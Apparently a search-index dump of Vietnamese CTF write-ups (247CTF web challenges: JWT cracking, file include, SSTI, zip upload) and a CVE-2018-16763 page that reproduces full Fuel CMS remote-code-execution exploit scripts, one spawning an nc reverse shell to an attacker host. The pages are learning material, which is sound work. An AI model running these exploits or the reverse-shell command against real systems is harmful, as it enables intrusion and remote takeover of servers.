\u0111\u01b0\u1ee3c V\u00ec \u0111\u00e2y l\u00e0 1 challenge \u1edf m\u1ee9c \u0111\u1ed9 t\u01b0\u01a1ng \u0111\u1ed1i d\u1ec5 n\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng john \u0111\u1ec3 t\u00ecm signature c\u1ee7a JWT token john ywt.txt --wordlist=~/Desktop/allthings/rockyou.txt --format=HMAC-SHA256 C\u00f3 th\u1ec3 xem m\u1ed9t v\u00e0i c\u00e1ch \u0111\u1ec3 bypass JWT Token t\u1ea1i https://tryhackme.com/room/owasptop102021 Th\u00f4ng qua vi\u1ec7c d\u00f9ng john ta c\u00f3 signature l\u00e0 wepwn247 . Ti\u1ebfn h\u00e0nh l\u00e0m token m\u1edbi v\u00e0 nh\u1eadn flag Token sau khi thay \u0111\u1ed5i Flag: 247CTF{df766362b470d11495214b2f8a4a31b3} What we learned \u00b6 JWT Token","title":"Flag Authoriser"},{"location":"247ctf/flag-authoriser/#flag-authoriser","text":"Challenge","title":"Flag Authoriser"},{"location":"247ctf/flag-authoriser/#writeup","text":"L\u1ea1i m\u1ed9t b\u00e0i v\u1edbi Flask ti\u1ebfp n\u00e8 Source code from flask import Flask , redirect , url_for , make_response , render_template , flash from flask_jwt_extended import JWTManager , create_access_token , jwt_optional , get_jwt_identity from secret import secret , admin_flag , jwt_secret app = Flask ( __name__ ) cookie = \"access_token_cookie\" app . config [ 'SECRET_KEY' ] = secret app . config [ 'JWT_SECRET_KEY' ] = jwt_secret app . config [ 'JWT_TOKEN_LOCATION' ] = [ 'cookies' ] app . config [ 'DEBUG' ] = False jwt = JWTManager ( app ) def redirect_to_flag ( msg ): flash ( ' %s ' % msg , 'danger' ) return redirect ( url_for ( 'flag' , _external = True )) @jwt . expired_token_loader def my_expired_token_callback (): return redirect_to_flag ( 'Token expired' ) @jwt . invalid_token_loader def my_invalid_token_callback ( callback ): return redirect_to_flag ( callback ) @jwt_optional def get_flag (): if get_jwt_identity () == 'admin' : return admin_flag @app . route ( '/flag' ) def flag (): response = make_response ( render_template ( 'main.html' , flag = get_flag ())) response . set_cookie ( cookie , create_access_token ( identity = 'anonymous' )) return response @app . route ( '/' ) def source (): return \" % s \" % o pen(__file__).read() if __name__ == \"__main__\" : app . run () B\u00e0i n\u00e0y h\u1ecd d\u00f9ng JWT token , Ta xem th\u00f4ng tin token JWT token","title":"WriteUp"},{"location":"247ctf/flag-authoriser/#jwt","text":"C\u00e1u tr\u00fac JWT Token","title":"JWT"},{"location":"247ctf/flag-authoriser/#tim-flag","text":"T\u1eeb th\u00f4ng tin token tr\u00ean, ta bi\u1ebft \u0111\u01b0\u1ee3c V\u00ec \u0111\u00e2y l\u00e0 1 challenge \u1edf m\u1ee9c \u0111\u1ed9 t\u01b0\u01a1ng \u0111\u1ed1i d\u1ec5 n\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng john \u0111\u1ec3 t\u00ecm signature c\u1ee7a JWT token john ywt.txt --wordlist=~/Desktop/allthings/rockyou.txt --format=HMAC-SHA256 C\u00f3 th\u1ec3 xem m\u1ed9t v\u00e0i c\u00e1ch \u0111\u1ec3 bypass JWT Token t\u1ea1i https://tryhackme.com/room/owasptop102021 Th\u00f4ng qua vi\u1ec7c d\u00f9ng john ta c\u00f3 signature l\u00e0 wepwn247 . Ti\u1ebfn h\u00e0nh l\u00e0m token m\u1edbi v\u00e0 nh\u1eadn flag Token sau khi thay \u0111\u1ed5i Flag: 247CTF{df766362b470d11495214b2f8a4a31b3}","title":"T\u00ecm flag"},{"location":"247ctf/flag-authoriser/#what-we-learned","text":"JWT Token","title":"What we learned"},{"location":"247ctf/forgotten-file-pointer/","tags":["247CTF"],"text":"Forgotten File Pointer \u00b6 Challenge WriteUp \u00b6 \u1ede challenge n\u00e0y, ch\u00fang ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111o\u1ea1n code php nh\u01b0 sau Source code <?php $fp = fopen ( \"/tmp/flag.txt\" , \"r\" ); if ( $_SERVER [ 'REQUEST_METHOD' ] === 'GET' && isset ( $_GET [ 'include' ]) && strlen ( $_GET [ 'include' ]) <= 10 ) { include ( $_GET [ 'include' ]); } fclose ( $fp ); echo highlight_file ( __FILE__ , true ); ?> T\u1eeb \u0111o\u1ea1n code tr\u00ean ta nh\u1eadn th\u1ea5y r\u1eb1ng: Tr\u00ecnh duy\u1ec7t nh\u1eadn GET HTTP Request v\u1edbi tham s\u1ed1 l\u00e0 include Ki\u1ec3m tra nh\u1eefng \u0111\u1ed1i s\u1ed1 truy\u1ec1n v\u00e0o include d\u01b0\u1edbi 10 k\u00ed t\u1ef1 th\u00ec th\u1ef1c thi include($_GET['include']); T\u00f3m l\u1ea1i, ta ph\u1ea3i bruteforce \u0111\u01b0\u1eddng d\u1eabn file h\u1ec7 th\u1ed1ng d\u01b0\u1edbi 11 k\u00ed t\u1ef1. /dev/fd/10 Flag Flag: 247CTF{4be4e08685e2ed433dde9171e887761e} What we learned \u00b6","title":"Forgotten File Pointer"},{"location":"247ctf/forgotten-file-pointer/#forgotten-file-pointer","text":"Challenge","title":"Forgotten File Pointer"},{"location":"247ctf/forgotten-file-pointer/#writeup","text":"\u1ede challenge n\u00e0y, ch\u00fang ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111o\u1ea1n code php nh\u01b0 sau Source code <?php $fp = fopen ( \"/tmp/flag.txt\" , \"r\" ); if ( $_SERVER [ 'REQUEST_METHOD' ] === 'GET' && isset ( $_GET [ 'include' ]) && strlen ( $_GET [ 'include' ]) <= 10 ) { include ( $_GET [ 'include' ]); } fclose ( $fp ); echo highlight_file ( __FILE__ , true ); ?> T\u1eeb \u0111o\u1ea1n code tr\u00ean ta nh\u1eadn th\u1ea5y r\u1eb1ng: Tr\u00ecnh duy\u1ec7t nh\u1eadn GET HTTP Request v\u1edbi tham s\u1ed1 l\u00e0 include Ki\u1ec3m tra nh\u1eefng \u0111\u1ed1i s\u1ed1 truy\u1ec1n v\u00e0o include d\u01b0\u1edbi 10 k\u00ed t\u1ef1 th\u00ec th\u1ef1c thi include($_GET['include']); T\u00f3m l\u1ea1i, ta ph\u1ea3i bruteforce \u0111\u01b0\u1eddng d\u1eabn file h\u1ec7 th\u1ed1ng d\u01b0\u1edbi 11 k\u00ed t\u1ef1. /dev/fd/10 Flag Flag: 247CTF{4be4e08685e2ed433dde9171e887761e}","title":"WriteUp"},{"location":"247ctf/forgotten-file-pointer/#what-we-learned","text":"","title":"What we learned"},{"location":"247ctf/secured-session/","tags":["247CTF"],"text":"Secured Session \u00b6 Challenge WriteUp \u00b6 Website challenge Khi v\u00e0o challenge ta th\u1ea5y \u0111o\u1ea1n code nh\u01b0 tr\u00ean v\u00e0 secret_key l\u00e0 th\u1ee9 ta ph\u1ea3i t\u00ecm. Lang thang tr\u00ean m\u1ea1ng th\u00ec ta th\u1ea5y \u0111\u01b0\u1ee3c \u0111o\u1ea1n code gi\u1ea3i m\u00e3 session cookie t\u1ea1i https://github.com/noraj/flask-session-cookie-manager . F12 \u0111\u1ec3 t\u00ecm session cookie Session cookie Decode v\u00e0 l\u1ea5y flag th\u00f4i Decode session cookie Flag Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91} What we learned \u00b6 Flask framework Tools for decode session cookie: flask_session_cookie_manager3.py","title":"Secured Session"},{"location":"247ctf/secured-session/#secured-session","text":"Challenge","title":"Secured Session"},{"location":"247ctf/secured-session/#writeup","text":"Website challenge Khi v\u00e0o challenge ta th\u1ea5y \u0111o\u1ea1n code nh\u01b0 tr\u00ean v\u00e0 secret_key l\u00e0 th\u1ee9 ta ph\u1ea3i t\u00ecm. Lang thang tr\u00ean m\u1ea1ng th\u00ec ta th\u1ea5y \u0111\u01b0\u1ee3c \u0111o\u1ea1n code gi\u1ea3i m\u00e3 session cookie t\u1ea1i https://github.com/noraj/flask-session-cookie-manager . F12 \u0111\u1ec3 t\u00ecm session cookie Session cookie Decode v\u00e0 l\u1ea5y flag th\u00f4i Decode session cookie Flag Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91}","title":"WriteUp"},{"location":"247ctf/secured-session/#what-we-learned","text":"Flask framework Tools for decode session cookie: flask_session_cookie_manager3.py","title":"What we learned"},{"location":"247ctf/slippery-upload/","tags":["247CTF"],"text":"Slippery Upload \u00b6 Challenge WriteUp \u00b6 Xem source code Source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from flask import Flask , request import zipfile , os app = Flask ( __name__ ) app . config [ 'SECRET_KEY' ] = os . urandom ( 32 ) app . config [ 'MAX_CONTENT_LENGTH' ] = 1 * 1024 * 1024 app . config [ 'UPLOAD_FOLDER' ] = '/tmp/uploads/' @app . route ( '/' ) def source (): return ' % s ' % o pen(' / app / run . py ').read() def zip_extract ( zarchive ): with zipfile . ZipFile ( zarchive , 'r' ) as z : for i in z . infolist (): with open ( os . path . join ( app . config [ 'UPLOAD_FOLDER' ], i . filename ), 'wb' ) as f : f . write ( z . open ( i . filename , 'r' ) . read ()) @app . route ( '/zip_upload' , methods = [ 'POST' ]) def zip_upload (): try : if request . files and 'zarchive' in request . files : zarchive = request . files [ 'zarchive' ] if zarchive and '.' in zarchive . filename and zarchive . filename . rsplit ( '.' , 1 )[ 1 ] . lower () == 'zip' and zarchive . content_type == 'application/octet-stream' : zpath = os . path . join ( app . config [ 'UPLOAD_FOLDER' ], ' %s .zip' % os . urandom ( 8 ) . hex ()) zarchive . save ( zpath ) zip_extract ( zpath ) return 'Zip archive uploaded and extracted!' return 'Only valid zip archives are acepted!' except : return 'Error occured during the zip upload process!' if __name__ == '__main__' : app . run () B\u00e0i n\u00e0y hay. \u0110\u00fang l\u00e0 b\u00e0i cu\u1ed1i c\u1ee7a Moderate. Ta th\u1ea5y \u0111\u01b0\u1ee3c url c\u1ea7n \u0111\u1ec3 d\u00f9ng POST HTTP Request l\u00e0 https:.../zip_upload nh\u01b0ng l\u1ea1i khum c\u00f3 giao di\u1ec7n cho upload file :)). C\u00e1ch nhanh nh\u1ea5t l\u00e0 ta t\u1ea1o 1 html c\u01a1 b\u1ea3n \u0111\u1ec3 upload file th\u00f4ng qua url \u0111\u00f3 (xem url upload nh\u01b0 1 API ph\u00eda backend) H\u1ecfi chatgpt v\u1ec1 code HTML HTML upload file Ta c\u1ea7n ch\u1ec9nh m\u1ed9t v\u00e0i th\u00f4ng s\u1ed1 \u0111\u1ec3 \u0111\u00fang v\u1edbi logic source code c\u1ee7a challenge <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"utf-8\" /> < title > File Upload </ title > </ head > < body > < h1 > Upload File ZIP </ h1 > < form action = \"https://14132b21eb964d08.247ctf.com/zip_upload\" method = \"post\" enctype = \"multipart/form-data\" > < label for = \"zipFile\" > Ch\u1ecdn m\u1ed9t file ZIP: </ label > < input type = \"file\" name = \"zarchive\" > < br > < input type = \"submit\" value = \"T\u1ea3i l\u00ean\" > </ form > </ body > </ html > R\u1ed3i, upload file th\u00f4i :V H\u00ecnh \u1ea3nh upload file th\u00e0nh c\u00f4ng b\u1eb1ng Burpsuite ::) Upload th\u00e0nh c\u00f4ng r\u1ed3i, Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91} What we learned \u00b6","title":"Slippery Upload"},{"location":"247ctf/slippery-upload/#slippery-upload","text":"Challenge","title":"Slippery Upload"},{"location":"247ctf/slippery-upload/#writeup","text":"Xem source code Source code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from flask import Flask , request import zipfile , os app = Flask ( __name__ ) app . config [ 'SECRET_KEY' ] = os . urandom ( 32 ) app . config [ 'MAX_CONTENT_LENGTH' ] = 1 * 1024 * 1024 app . config [ 'UPLOAD_FOLDER' ] = '/tmp/uploads/' @app . route ( '/' ) def source (): return ' % s ' % o pen(' / app / run . py ').read() def zip_extract ( zarchive ): with zipfile . ZipFile ( zarchive , 'r' ) as z : for i in z . infolist (): with open ( os . path . join ( app . config [ 'UPLOAD_FOLDER' ], i . filename ), 'wb' ) as f : f . write ( z . open ( i . filename , 'r' ) . read ()) @app . route ( '/zip_upload' , methods = [ 'POST' ]) def zip_upload (): try : if request . files and 'zarchive' in request . files : zarchive = request . files [ 'zarchive' ] if zarchive and '.' in zarchive . filename and zarchive . filename . rsplit ( '.' , 1 )[ 1 ] . lower () == 'zip' and zarchive . content_type == 'application/octet-stream' : zpath = os . path . join ( app . config [ 'UPLOAD_FOLDER' ], ' %s .zip' % os . urandom ( 8 ) . hex ()) zarchive . save ( zpath ) zip_extract ( zpath ) return 'Zip archive uploaded and extracted!' return 'Only valid zip archives are acepted!' except : return 'Error occured during the zip upload process!' if __name__ == '__main__' : app . run () B\u00e0i n\u00e0y hay. \u0110\u00fang l\u00e0 b\u00e0i cu\u1ed1i c\u1ee7a Moderate. Ta th\u1ea5y \u0111\u01b0\u1ee3c url c\u1ea7n \u0111\u1ec3 d\u00f9ng POST HTTP Request l\u00e0 https:.../zip_upload nh\u01b0ng l\u1ea1i khum c\u00f3 giao di\u1ec7n cho upload file :)). C\u00e1ch nhanh nh\u1ea5t l\u00e0 ta t\u1ea1o 1 html c\u01a1 b\u1ea3n \u0111\u1ec3 upload file th\u00f4ng qua url \u0111\u00f3 (xem url upload nh\u01b0 1 API ph\u00eda backend) H\u1ecfi chatgpt v\u1ec1 code HTML HTML upload file Ta c\u1ea7n ch\u1ec9nh m\u1ed9t v\u00e0i th\u00f4ng s\u1ed1 \u0111\u1ec3 \u0111\u00fang v\u1edbi logic source code c\u1ee7a challenge <!DOCTYPE html> < html lang = \"en\" > < head > < meta charset = \"utf-8\" /> < title > File Upload </ title > </ head > < body > < h1 > Upload File ZIP </ h1 > < form action = \"https://14132b21eb964d08.247ctf.com/zip_upload\" method = \"post\" enctype = \"multipart/form-data\" > < label for = \"zipFile\" > Ch\u1ecdn m\u1ed9t file ZIP: </ label > < input type = \"file\" name = \"zarchive\" > < br > < input type = \"submit\" value = \"T\u1ea3i l\u00ean\" > </ form > </ body > </ html > R\u1ed3i, upload file th\u00f4i :V H\u00ecnh \u1ea3nh upload file th\u00e0nh c\u00f4ng b\u1eb1ng Burpsuite ::) Upload th\u00e0nh c\u00f4ng r\u1ed3i, Flag: 247CTF{da80795f8a5cab2e037d7385807b9a91}","title":"WriteUp"},{"location":"247ctf/slippery-upload/#what-we-learned","text":"","title":"What we learned"},{"location":"247ctf/the-twig-injector/","tags":["247CTF"],"text":"The Twjg Injector \u00b6 Challenge WriteUp \u00b6 Ta xem source code challenge Source code <?php namespace App\\Controller ; use Symfony\\Component\\HttpFoundation\\Request ; use Symfony\\Component\\HttpFoundation\\Response ; use Symfony\\Component\\Routing\\Annotation\\Route ; use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController ; class ChallengeController extends AbstractController { /** * @Route(\"/inject\") */ public function inject ( Request $request ) { $inject = preg_replace ( '/[^{\\.}a-z\\|\\_]/' , '' , $request -> query -> get ( 'inject' )); $response = new Response ( $this -> get ( 'twig' ) -> createTemplate ( \"Welcome to the twig injector! \\n ${ inject } \" ) -> render ()); $response -> headers -> set ( 'Content-Type' , 'text/plain' ); return $response ; } /** * @Route(\"/\") */ public function index () { return new Response ( highlight_file ( __FILE__ , true )); } } B\u00e0i n\u00e0y source code h\u1ecd vi\u1ebft b\u1eb1ng Symfony. N\u1ebfu c\u00e1c b\u1ea1n th\u1eed h\u1ecfi chatgpt v\u1ec1 \u00fd ngh\u0129a \u0111o\u1ea1n code, n\u00f3 s\u1ebd tr\u1ea3 l\u1eddi c\u00e1i b\u1ea1n \u0111\u1ea5y :3 ChatGPT ChatGPT Ro\u00e0i bi\u1ebft \u0111\u01b0\u1ee3c \u00fd ngh\u0129a m\u00e3 ngu\u1ed3n l\u00e0 xong b\u00e0i r\u1ed3i, L\u00ean PayloadsAllTheThings l\u1ee5m c\u1ea5u tr\u00fac dump l\u00e0 ra flag {{app.request.server.all|join(',')}} B\u00e0i n\u00e0y n\u00f3 c\u00f3 \u0111o\u1ea1n $inject = preg_replace('/[^{\\.}a-z\\|\\_]/', '', $request->query->get('inject')); d\u00f9ng \u0111\u1ec3 filter \u0111\u1ea7u v\u00e0o n\u00ean test nh\u1eefng c\u00e1i basic nh\u01b0 {{ 4 * 4 }}, {{ 4 * '4' }} s\u1ebd kh\u00f4ng \u0111\u01b0\u1ee3c \u0111\u00e2u Flag: 247CTF{b8d4dce713400424bc2ab7fa673f231c} What we learned \u00b6 Symfony","title":"The Twig Injector"},{"location":"247ctf/the-twig-injector/#the-twjg-injector","text":"Challenge","title":"The Twjg Injector"},{"location":"247ctf/the-twig-injector/#writeup","text":"Ta xem source code challenge Source code <?php namespace App\\Controller ; use Symfony\\Component\\HttpFoundation\\Request ; use Symfony\\Component\\HttpFoundation\\Response ; use Symfony\\Component\\Routing\\Annotation\\Route ; use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController ; class ChallengeController extends AbstractController { /** * @Route(\"/inject\") */ public function inject ( Request $request ) { $inject = preg_replace ( '/[^{\\.}a-z\\|\\_]/' , '' , $request -> query -> get ( 'inject' )); $response = new Response ( $this -> get ( 'twig' ) -> createTemplate ( \"Welcome to the twig injector! \\n ${ inject } \" ) -> render ()); $response -> headers -> set ( 'Content-Type' , 'text/plain' ); return $response ; } /** * @Route(\"/\") */ public function index () { return new Response ( highlight_file ( __FILE__ , true )); } } B\u00e0i n\u00e0y source code h\u1ecd vi\u1ebft b\u1eb1ng Symfony. N\u1ebfu c\u00e1c b\u1ea1n th\u1eed h\u1ecfi chatgpt v\u1ec1 \u00fd ngh\u0129a \u0111o\u1ea1n code, n\u00f3 s\u1ebd tr\u1ea3 l\u1eddi c\u00e1i b\u1ea1n \u0111\u1ea5y :3 ChatGPT ChatGPT Ro\u00e0i bi\u1ebft \u0111\u01b0\u1ee3c \u00fd ngh\u0129a m\u00e3 ngu\u1ed3n l\u00e0 xong b\u00e0i r\u1ed3i, L\u00ean PayloadsAllTheThings l\u1ee5m c\u1ea5u tr\u00fac dump l\u00e0 ra flag {{app.request.server.all|join(',')}} B\u00e0i n\u00e0y n\u00f3 c\u00f3 \u0111o\u1ea1n $inject = preg_replace('/[^{\\.}a-z\\|\\_]/', '', $request->query->get('inject')); d\u00f9ng \u0111\u1ec3 filter \u0111\u1ea7u v\u00e0o n\u00ean test nh\u1eefng c\u00e1i basic nh\u01b0 {{ 4 * 4 }}, {{ 4 * '4' }} s\u1ebd kh\u00f4ng \u0111\u01b0\u1ee3c \u0111\u00e2u Flag: 247CTF{b8d4dce713400424bc2ab7fa673f231c}","title":"WriteUp"},{"location":"247ctf/the-twig-injector/#what-we-learned","text":"Symfony","title":"What we learned"},{"location":"247ctf/trusted-client/","tags":["247CTF"],"text":"Trusted Client \u00b6 Challenge WriteUp \u00b6 Challenge n\u00e0y cung c\u1ea5p cho ta m\u1ed9t form login g\u1ed3m c\u00f3 username/password form login F12 l\u00ean th\u00ec th\u1ea5y \u0111o\u1ea1n code javescript mang m\u1ee5c \u0111\u00edch x\u1eed l\u00ed logic login \u0110o\u1ea1n code javascript \u0110\u00e2y l\u00e0 JSFuck v\u00e0 c\u00f3 nhi\u1ec1u tool \u0111\u1ec3 decode n\u00f3 v\u00e0 t\u00f4i d\u00f9ng https://www.dcode.fr/jsfuck-language Flag Flag: 247CTF{6c91b7f7f12c852f892293d16dba0148} What we learned \u00b6 Shouldn't leave information (Eg: username/password,...) on the client side","title":"Trusted Client"},{"location":"247ctf/trusted-client/#trusted-client","text":"Challenge","title":"Trusted Client"},{"location":"247ctf/trusted-client/#writeup","text":"Challenge n\u00e0y cung c\u1ea5p cho ta m\u1ed9t form login g\u1ed3m c\u00f3 username/password form login F12 l\u00ean th\u00ec th\u1ea5y \u0111o\u1ea1n code javescript mang m\u1ee5c \u0111\u00edch x\u1eed l\u00ed logic login \u0110o\u1ea1n code javascript \u0110\u00e2y l\u00e0 JSFuck v\u00e0 c\u00f3 nhi\u1ec1u tool \u0111\u1ec3 decode n\u00f3 v\u00e0 t\u00f4i d\u00f9ng https://www.dcode.fr/jsfuck-language Flag Flag: 247CTF{6c91b7f7f12c852f892293d16dba0148}","title":"WriteUp"},{"location":"247ctf/trusted-client/#what-we-learned","text":"Shouldn't leave information (Eg: username/password,...) on the client side","title":"What we learned"},{"location":"battle.cookiearena.org/","text":"","title":"Index"},{"location":"cve/","text":"CVE \u00b6 CVE-2019-8942 CVE-2019-9053 CVE-2018-16763","title":"CVE"},{"location":"cve/#cve","text":"CVE-2019-8942 CVE-2019-9053 CVE-2018-16763","title":"CVE"},{"location":"cve/CVE-2018-16763/","text":"CVE-2018-16763 \u00b6 https://www.exploit-db.com/search?cve=2018-16763 T\u1ed5ng quan \u00b6 CVE n\u00e0y n\u00f3i v\u1ec1 l\u1ed7 h\u1ecfng c\u1ee7a Fuel CMS version 1.4.1 v\u1ec1 vi\u1ec7c ta c\u00f3 th\u1ec3 ch\u00e8n v\u00e0 th\u1ef1c thi m\u00e3 t\u1eeb xa th\u00f4ng qua parameter c\u1ee7a ../pages/select/?filter c\u00f3 trong phi\u00ean b\u1ea3n. Th\u00f4ng qua Exploit-DB ho\u1eb7c searchsploit tr\u00ean m\u00e1y kali, ta s\u1ebd c\u00f3 \u0111\u01b0\u1ee3c 2 file khai th\u00e1c l\u1ed7 h\u1ed5ng l\u00e0 47138.py v\u00e0 50477.py File 50477.py m\u00f4 t\u1ea3 tr\u1ef1c quan h\u01a1n t\u1eeb vi\u1ec7c RCE, 50477.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3) # Exploit Author: Padsala Trushal # Date: 2021-11-03 # Vendor Homepage: https://www.getfuelcms.com/ # Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1 # Version: <= 1.4.1 # Tested on: Ubuntu - Apache2 - php5 # CVE : CVE-2018-16763 #!/usr/bin/python3 import requests from urllib.parse import quote import argparse import sys from colorama import Fore , Style def get_arguments (): parser = argparse . ArgumentParser ( description = 'fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit' , usage = f 'python3 { sys . argv [ 0 ] } -u <url>' , epilog = f 'EXAMPLE - python3 { sys . argv [ 0 ] } -u http://10.10.21.74' ) parser . add_argument ( '-v' , '--version' , action = 'version' , version = '1.2' , help = 'show the version of exploit' ) parser . add_argument ( '-u' , '--url' , metavar = 'url' , dest = 'url' , help = 'Enter the url' ) args = parser . parse_args () if len ( sys . argv ) <= 2 : parser . print_usage () sys . exit () return args args = get_arguments () url = args . url if \"http\" not in url : sys . stderr . write ( \"Enter vaild url\" ) sys . exit () try : r = requests . get ( url ) if r . status_code == 200 : print ( Style . BRIGHT + Fore . GREEN + \"[+]Connecting...\" + Style . RESET_ALL ) except requests . ConnectionError : print ( Style . BRIGHT + Fore . RED + \"Can't connect to url\" + Style . RESET_ALL ) sys . exit () while True : cmd = input ( Style . BRIGHT + Fore . YELLOW + \"Enter Command $\" + Style . RESET_ALL ) main_url = url + \"/fuel/pages/select/?filter= %27% 2b %70% 69 %28% 70 %72% 69 %6e%74% 28 %24% 61 %3d%27% 73 %79% 73 %74% 65 %6d%27% 29 %29% 2b %24% 61 %28% 27\" + quote ( cmd ) + \" %27% 29%2b%27\" r = requests . get ( main_url ) #<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\"> output = r . text . split ( '<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\">' ) print ( output [ 0 ]) if cmd == \"exit\" : break Ta th\u1ea5y source code tr\u00ean m\u00f4 t\u1ea3 vi\u1ec7c l\u1ea5y 1 gi\u00e1 tr\u1ecb l\u1ec7nh t\u1eeb attacker (bi\u1ebfn cmd \u1edf d\u00f2ng 52) v\u00e0 truy\u1ec1n v\u00e0o \u0111o\u1ea1n url \u0111\u1ec3 attack, c\u00f4ng \u0111o\u1ea1n ti\u1ebfp theo l\u00e0 \u0111o\u1ea1n output d\u1eef li\u1ec7u t\u1eeb h\u1ec7 th\u1ed1ng. V\u1eady t\u1eeb flow n\u00e0y th\u00ec ta s\u1ebd l\u00e0m g\u00ec ti\u1ebfp theo? N\u1ebfu ta c\u00f3 th\u1ec3 xem \u0111\u01b0\u1ee3c file /etc/shadow th\u00ec c\u00e2u chuy\u1ec7n c\u00f3 th\u1ec3 k\u1ebft th\u00fac t\u1ea1i \u0111\u00e2y. Nh\u01b0ng n\u1ebfu kh\u00f4ng xem \u0111\u01b0\u1ee3c th\u00ec sao? M\u1ed9t \u00fd t\u01b0\u1edfng m\u1edbi ta c\u00f3 th\u1ec3 t\u1ea1o reverse shell b\u1eb1ng Netcat OpenBsd v\u00e0 sau \u0111\u00f3 d\u00f9ng python -c import pty;pty.spawn (\"/bin/bash\") (n\u1ebfu c\u00f3 th\u1ec3) \u0111\u1ec3 v\u00e0o terminal c\u1ee7a m\u00e1y n\u1ea1n nh\u00e2n. Ro\u00e0i, d\u1ef1a v\u00e0o \u00fd t\u01b0\u1edfng tr\u00ean, ta s\u1ebd c\u1ea3i ti\u1ebfn \u0111o\u1ea1n code khai th\u00e1c tr\u00ean th\u00e0nh # Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated # Date 2021-08-16 # Exploit Author: jtaubs1 (ice-wzl) # Vendor Homepage: https://www.getfuelcms.com/ # Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1 # Version: <= 1.4.1 # Tested on: Ubuntu - Apache2 - php5 # CVE : CVE-2018-16763 # Update included: Works with python3 # Removed burp proxy code to allow it to run as a stand alone RCE exploit. # Takes sys.args # Spawns a Reverse shell #!/usr/bin/python3 import requests import urllib.parse import sys url_victim_machine = sys . argv [ 1 ] attacker_ip = sys . argv [ 2 ] attacker_port = sys . argv [ 3 ] command = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc \" command += attacker_ip command += \" \" command += attacker_port command += \">/tmp/f\" payload = url_victim_machine + \"/fuel/pages/select/?filter= %27% 2b %70% 69 %28% 70 %72% 69 %6e%74% 28 %24% 61 %3d%27% 73 %79% 73 %74% 65 %6d%27% 29 %29% 2b %24% 61 %28% 27\" + urllib . parse . quote ( command ) + \" %27% 29%2b%27\" r = requests . get ( payload ) print ( r ) \u0110o\u1ea1n code tr\u00ean c\u00f3 \u01b0u \u0111i\u1ec3m l\u00e0 n\u00f3 s\u1ebd th\u1ef1c hi\u1ec7n lu\u00f4n c\u00f4ng vi\u1ec7c t\u1ea1o 1 revershell t\u1eeb m\u00e1y n\u1ea1n nh\u00e2n \u0111\u1ebfn m\u00e1y ch\u00fang ta th\u00f4ng qua l\u1ed7 h\u1ed5ng. Challenge \u00b6 TryHackMe | Ignite Writeup","title":"CVE-2018-16763"},{"location":"cve/CVE-2018-16763/#cve-2018-16763","text":"https://www.exploit-db.com/search?cve=2018-16763","title":"CVE-2018-16763"},{"location":"cve/CVE-2018-16763/#tong-quan","text":"CVE n\u00e0y n\u00f3i v\u1ec1 l\u1ed7 h\u1ecfng c\u1ee7a Fuel CMS version 1.4.1 v\u1ec1 vi\u1ec7c ta c\u00f3 th\u1ec3 ch\u00e8n v\u00e0 th\u1ef1c thi m\u00e3 t\u1eeb xa th\u00f4ng qua parameter c\u1ee7a ../pages/select/?filter c\u00f3 trong phi\u00ean b\u1ea3n. Th\u00f4ng qua Exploit-DB ho\u1eb7c searchsploit tr\u00ean m\u00e1y kali, ta s\u1ebd c\u00f3 \u0111\u01b0\u1ee3c 2 file khai th\u00e1c l\u1ed7 h\u1ed5ng l\u00e0 47138.py v\u00e0 50477.py File 50477.py m\u00f4 t\u1ea3 tr\u1ef1c quan h\u01a1n t\u1eeb vi\u1ec7c RCE, 50477.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3) # Exploit Author: Padsala Trushal # Date: 2021-11-03 # Vendor Homepage: https://www.getfuelcms.com/ # Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1 # Version: <= 1.4.1 # Tested on: Ubuntu - Apache2 - php5 # CVE : CVE-2018-16763 #!/usr/bin/python3 import requests from urllib.parse import quote import argparse import sys from colorama import Fore , Style def get_arguments (): parser = argparse . ArgumentParser ( description = 'fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit' , usage = f 'python3 { sys . argv [ 0 ] } -u <url>' , epilog = f 'EXAMPLE - python3 { sys . argv [ 0 ] } -u http://10.10.21.74' ) parser . add_argument ( '-v' , '--version' , action = 'version' , version = '1.2' , help = 'show the version of exploit' ) parser . add_argument ( '-u' , '--url' , metavar = 'url' , dest = 'url' , help = 'Enter the url' ) args = parser . parse_args () if len ( sys . argv ) <= 2 : parser . print_usage () sys . exit () return args args = get_arguments () url = args . url if \"http\" not in url : sys . stderr . write ( \"Enter vaild url\" ) sys . exit () try : r = requests . get ( url ) if r . status_code == 200 : print ( Style . BRIGHT + Fore . GREEN + \"[+]Connecting...\" + Style . RESET_ALL ) except requests . ConnectionError : print ( Style . BRIGHT + Fore . RED + \"Can't connect to url\" + Style . RESET_ALL ) sys . exit () while True : cmd = input ( Style . 